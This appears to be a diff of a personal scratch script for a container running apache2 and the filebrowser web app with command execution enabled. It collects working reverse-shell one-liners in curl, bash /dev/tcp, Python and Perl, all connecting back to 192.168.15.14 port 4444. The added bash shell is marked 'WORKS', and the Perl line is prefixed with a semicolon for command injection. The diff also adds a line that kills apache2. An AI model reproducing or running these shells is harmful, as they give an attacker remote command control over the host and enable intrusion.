@@ -20,15 +20,18 @@ apache2 -D FOREGROUND &
 # IMPORTANT: keep container alive
 tail -f /dev/null
 
-
+pkill apache2
 /home/supernova/bin/filebrowser  --address 0.0.0.0 --port 8080 --disable-exec=false --root /home/supernova/file-browser --database /home/supernova/filebrowser.db
 
  
 C='curl -Ns telnet://192.168.15.14:4444'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
 
 
-/bin/bash  
-bash -c "echo file renamed: \$FILE"
+
+WORKS 
+
+sh -i >& /dev/tcp/192.168.15.14/4444 0>&1
+/bin/bash -c "echo file renamed: \$FILE"
 
 # sh -c "echo this old filename has been changed and is now deprecated: \$FILE"
 
@@ -54,6 +57,7 @@ sh -c "echo this filename has been renamed: \$FILE"
 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.15.14",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
+; perl -e 'use Socket;$i="192.168.15.14";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};
 
 ps aux | grep synk_daemon
 
